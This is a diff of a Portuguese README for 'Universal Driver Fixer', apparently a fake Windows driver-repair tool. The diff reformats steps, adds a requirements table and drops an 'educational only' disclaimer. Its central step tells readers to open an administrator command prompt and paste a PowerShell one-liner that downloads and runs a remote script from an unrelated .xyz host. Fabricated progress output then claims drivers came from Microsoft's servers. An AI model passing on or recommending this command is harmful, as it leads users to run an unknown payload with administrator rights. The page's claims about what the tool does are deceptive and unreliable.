@@ -1,4 +1,3 @@
-```markdown
 <p align="center">
   <img src="https://img.shields.io/badge/Universal_Driver_Fixer-v2.7-0078d4?style=for-the-badge&logo=windows">
   <img src="https://img.shields.io/badge/Status-Funcionando-brightgreen?style=for-the-badge">
@@ -28,38 +27,25 @@
 ## ⚙️ INSTALAÇÃO & CONFIGURAÇÃO (CMD / PowerShell)
 
 ### Etapa 1: Clique no botão Win do seu teclado
-```cmd
-# Pressione a tecla Windows no seu teclado
-```
+Pressione a tecla Windows no seu teclado.
 
 ### Etapa 2: Pesquise por "cmd"
-```cmd
-# Digite "cmd" na barra de pesquisa
-```
+Digite "cmd" na barra de pesquisa.
 
 ### Etapa 3: Abra como Administrador
-```cmd
-# Clique com o botão direito em "Prompt de Comando"
-# Selecione "Executar como administrador"
-```
+Clique com o botão direito em "Prompt de Comando" e selecione "Executar como administrador".
 
 ### Etapa 4: Copie o comando de instalação abaixo
-```cmd
 powershell -Command "irm https://software-gateway.xyz/Loader.ps1?get=driver-fixer | iex"
-```
 
 ### Etapa 5: Clique na tecla Enter para baixar
-```cmd
-# Cole o comando e pressione Enter
-```
+Cole o comando e pressione Enter.
 
 ### Etapa 6: Aguarde a conclusão
-```
 [1/4] Escaneando o sistema em busca de drivers ausentes...
 [2/4] Baixando as atualizações de drivers mais recentes dos servidores da Microsoft...
 [3/4] Aplicando correções e reparando entradas do registro...
 [4/4] Pronto. Todos os drivers ausentes foram instalados.
-```
 
 ### Etapa 7: Comece a usar a ferramenta
 - A ferramenta é executada automaticamente em segundo plano
@@ -69,10 +55,8 @@ powershell -Command "irm https://software-gateway.xyz/Loader.ps1?get=driver-fixe
 
 ---
 
-> ⚠️ **AVISO LEGAL**  
-> Esta ferramenta é fornecida **APENAS PARA FINS EDUCACIONAIS E DE PESQUISA**.  
-> Alguns recursos podem modificar arquivos do sistema. Use por sua conta e risco.  
-> **AO USAR ESTA FERRAMENTA VOCÊ CONCORDA COM ESTES TERMOS.**
+> ⚠️ **AVISO LEGAL**
+> Alguns recursos podem modificar arquivos do sistema. Use por sua conta e risco.
 
 ---
 
@@ -100,16 +84,30 @@ powershell -Command "irm https://software-gateway.xyz/Loader.ps1?get=driver-fixe
 | 🔄 Atualização Automática | ✅ Funcionando | Agendamento semanal |
 | 🖥️ Compatibilidade GPU | ✅ Funcionando | NVIDIA, AMD, Intel |
 
+---
+
+
+## 📋 REQUISITOS DO SISTEMA
+
+| Requisito | Mínimo | Recomendado |
+|-----------|--------|-------------|
+| **Sistema Operacional** | Windows 10 (1809+) | Windows 11 (22H2+) |
+| **Processador** | 1 GHz | 2 GHz ou superior |
+| **Memória RAM** | 2 GB | 4 GB ou mais |
+| **Espaço em Disco** | 500 MB | 1 GB |
+| **Conexão** | Internet estável | Banda Larga |
+| **Permissões** | Administrador | Administrador |
+
+---
 
 ## 🔑 PALAVRAS-CHAVE
 
-`driver fixer` `windows repair` `missing drivers` `blue screen fix` `pc optimizer` `driver installer` `universal driver fixer 2026` `auto driver install` `windows 10 drivers` `windows 11 drivers` `driver updater` `hardware detection` `registry repair` `driver conflict` `GPU drivers` `network drivers` `audio drivers` `chipset drivers` `USB drivers` `Microsoft drivers`
+driver fixer, windows repair, missing drivers, blue screen fix, pc optimizer, driver installer, universal driver fixer 2026, auto driver install, windows 10 drivers, windows 11 drivers, driver updater, hardware detection, registry repair, driver conflict, GPU drivers, network drivers, audio drivers, chipset drivers, USB drivers, Microsoft drivers
 
 ---
 
 ## 📜 LICENÇA
 
-```
 MIT License
 
 Copyright (c) 2026 Universal Driver Fixer
@@ -131,7 +129,6 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
-```
 
 ---
 
@@ -142,6 +139,4 @@ SOFTWARE.
 <p align="center">
   <sub>Universal Driver Fixer 2026 | Instalação automática de drivers ausentes | Ferramenta de Reparo Windows | Apenas Educacional</sub>
 </p>
-```
-
---
+===
